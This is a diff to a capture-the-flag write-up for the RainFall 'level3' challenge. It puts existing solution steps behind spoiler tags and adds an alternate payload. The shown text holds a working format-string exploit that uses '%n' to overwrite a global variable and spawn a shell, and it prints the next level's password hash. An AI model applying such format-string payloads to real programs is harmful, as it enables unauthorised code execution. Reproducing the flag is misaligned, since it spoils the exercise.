@@ -47,17 +47,38 @@ It prints our string, then the address of ENV, some more addresses for locals an
 And now, we can use something clever, we can input the adress of `m` as the first parameters, then use `%x` to pop the element of the stack until we arrive at the address of `m`, and write what we want!
 `%n` is used to write the bytes we wrote with printf, to the last address pushed onto the stack so m, it will write 49 + the previous bytes = 64 to `m`:
 
-```bash
-level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x%x%49u%n"' > /var/crash/write
-level3@RainFall:~$ cat /var/crash/write - | ./level3
-��200b7fd1ac0                                       3086956496
-Wait what?!
-cat /home/user/level4/.pass
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
-```
+<details>
+    <summary>Spoiler</summary>
+
+  And now, we can use something clever, we can input the adress of `m` as the first parameters, then use `%x` to pop the element of the stack until we arrive at the address of `m`, and write what we want!
+  `%n` is used to write the bytes we wrote with printf, to the last address pushed onto the stack so m, it will write 49 + the previous bytes = 64 to `m`:
+
+    ```bash
+    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x%x%49u%n"' > /var/crash/write
+    level3@RainFall:~$ cat /var/crash/write - | ./level3
+    ��200b7fd1ac0                                       3086956496
+    Wait what?!
+    cat /home/user/level4/.pass
+    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+    ```
+
+</details>
+
 
 
 ### Alternate write
+
+<details>
+    <summary>Spoiler</summary>
+
+We can also substitute the `49u` and instead print 38 a, which will produce the same result!
+
+```bash
+python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/write
+```
+
+</details>
+
 
 We can also substitute the `49u` and instead print 38 a, which will produce the same result!
 
